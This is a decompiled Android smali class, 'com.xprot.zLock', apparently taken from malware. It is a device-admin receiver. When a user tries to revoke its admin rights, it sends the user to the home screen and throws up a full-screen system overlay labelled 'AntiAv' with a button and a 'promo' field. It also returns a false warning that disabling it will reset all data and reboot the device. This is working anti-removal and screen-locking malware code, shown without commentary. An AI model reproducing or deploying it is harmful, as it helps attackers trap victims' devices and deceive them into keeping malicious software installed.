.class public Lcom/xprot/zLock;
.super Landroid/app/admin/DeviceAdminReceiver;
.source "zLock.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 35
    invoke-direct {p0}, Landroid/app/admin/DeviceAdminReceiver;-><init>()V

    return-void
.end method

.method private Eset4(Landroid/view/WindowManager;Landroid/view/View;Landroid/view/WindowManager$LayoutParams;)V
    .locals 0
    .param p1, "wm"    # Landroid/view/WindowManager;
    .param p2, "x"    # Landroid/view/View;
    .param p3, "y"    # Landroid/view/WindowManager$LayoutParams;

    .prologue
    .line 103
    invoke-interface {p1, p2, p3}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 105
    return-void
.end method


# virtual methods
.method public onDisableRequested(Landroid/content/Context;Landroid/content/Intent;)Ljava/lang/CharSequence;
    .locals 14
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    .line 40
    new-instance v11, Landroid/content/Intent;

    const-string v1, "android.settings.SETTINGS"

    invoke-direct {v11, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 41
    .local v11, "intentA":Landroid/content/Intent;
    const/high16 v1, 0x40000000    # 2.0f

    invoke-virtual {v11, v1}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 42
    const/high16 v1, 0x10000000

    invoke-virtual {v11, v1}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 43
    invoke-virtual {p1, v11}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    .line 45
    new-instance v7, Landroid/content/Intent;

    const-string v1, "android.intent.action.MAIN"

    invoke-direct {v7, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 46
    .local v7, "Home":Landroid/content/Intent;
    const-string v1, "android.intent.category.HOME"

    invoke-virtual {v7, v1}, Landroid/content/Intent;->addCategory(Ljava/lang/String;)Landroid/content/Intent;

    .line 47
    const/high16 v1, 0x10000000

    invoke-virtual {v7, v1}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 48
    invoke-virtual {p1, v7}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    .line 51
    new-instance v0, Landroid/view/WindowManager$LayoutParams;

    .line 52
    const/4 v1, -0x1

    const/4 v2, -0x2

    .line 53
    const/16 v3, 0x7da

    .line 54
    const/16 v4, 0x400

    .line 55
    const/4 v5, -0x3

    .line 51
    invoke-direct/range {v0 .. v5}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    .line 57
    .local v0, "params":Landroid/view/WindowManager$LayoutParams;
    const-string v1, "window"

    invoke-virtual {p1, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/view/WindowManager;

    .line 58
    .local v5, "wm":Landroid/view/WindowManager;
    const-string v1, "layout_inflater"

    invoke-virtual {p1, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v10

    check-cast v10, Landroid/view/LayoutInflater;

    .line 59
    .local v10, "inflater":Landroid/view/LayoutInflater;
    const v1, 0x7f030005

    const/4 v2, 0x0

    invoke-virtual {v10, v1, v2}, Landroid/view/LayoutInflater;->inflate(ILandroid/view/ViewGroup;)Landroid/view/View;

    move-result-object v6

    .line 60
    .local v6, "AntiAv":Landroid/view/View;
    move-object v8, v6

    .line 61
    .local v8, "X":Landroid/view/View;
    move-object v9, v0

    .line 62
    .local v9, "Y":Landroid/view/WindowManager$LayoutParams;
    invoke-direct {p0, v5, v8, v9}, Lcom/xprot/zLock;->Eset4(Landroid/view/WindowManager;Landroid/view/View;Landroid/view/WindowManager$LayoutParams;)V

    .line 65
    invoke-virtual {p1}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v1

    const-string v2, "ZBLK"

    const-string v12, "id"

    invoke-virtual {p1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v1, v2, v12, v13}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v1

    invoke-virtual {v6, v1}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v4

    .line 64
    check-cast v4, Landroid/widget/Button;

    .line 68
    .local v4, "Tmp":Landroid/widget/Button;
    invoke-virtual {p1}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v1

    const-string v2, "promo"

    const-string v12, "id"

    invoke-virtual {p1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v1, v2, v12, v13}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v1

    invoke-virtual {v6, v1}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v3

    .line 67
    check-cast v3, Landroid/widget/TextView;

    .line 73
    .local v3, "Promo":Landroid/widget/TextView;
    new-instance v1, Lcom/xprot/zLock$1;

    move-object v2, p0

    invoke-direct/range {v1 .. v6}, Lcom/xprot/zLock$1;-><init>(Lcom/xprot/zLock;Landroid/widget/TextView;Landroid/widget/Button;Landroid/view/WindowManager;Landroid/view/View;)V

    invoke-virtual {v4, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 97
    const-string v1, "This action will reset all your data.\n\nClick \"Yes\" and your\'s device will reboot and \"No\" for cancel."

    return-object v1
.end method

.method public onDisabled(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 0
    .param p1, "c"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    .line 111
    invoke-super {p0, p1, p2}, Landroid/app/admin/DeviceAdminReceiver;->onDisabled(Landroid/content/Context;Landroid/content/Intent;)V

    .line 112
    return-void
.end method

.method public onEnabled(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 0
    .param p1, "c"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    .line 116
    invoke-super {p0, p1, p2}, Landroid/app/admin/DeviceAdminReceiver;->onEnabled(Landroid/content/Context;Landroid/content/Intent;)V

    .line 118
    return-void
.end method
